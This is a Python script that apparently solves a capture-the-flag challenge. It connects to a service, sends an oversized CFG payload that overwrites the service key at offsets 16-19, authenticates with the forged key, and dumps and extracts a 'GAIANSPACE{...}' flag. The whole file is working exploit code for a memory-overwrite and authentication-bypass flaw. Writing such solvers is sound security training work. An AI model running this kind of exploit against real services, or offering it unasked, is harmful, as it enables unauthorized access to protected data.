
#!/usr/bin/env python3
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9707

# Overwrite the service key at offsets 16 through 19.
new_key = b"ABCD"
payload = bytes(16) + new_key

commands = [
    b"CFG " + payload.hex().encode("ascii"),
    b"AUTH " + new_key.hex().encode("ascii"),
    b"DUMP",
]

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    stream = sock.makefile("rb")

    print(stream.readline().decode("ascii").strip())

    for command in commands:
        sock.sendall(command + b"\n")
        response = stream.readline().decode("ascii").strip()
        print(f"{command.decode('ascii')}: {response}")

        if command.startswith(b"AUTH ") and response != "MAINT OK":
            raise RuntimeError("Authentication failed")

        if command == b"DUMP":
            match = re.search(r"GAIANSPACE\{[^}]+\}", response)
            if match is None:
                raise RuntimeError("Flag not found")
            print(f"\nFLAG: {match.group(0)}")

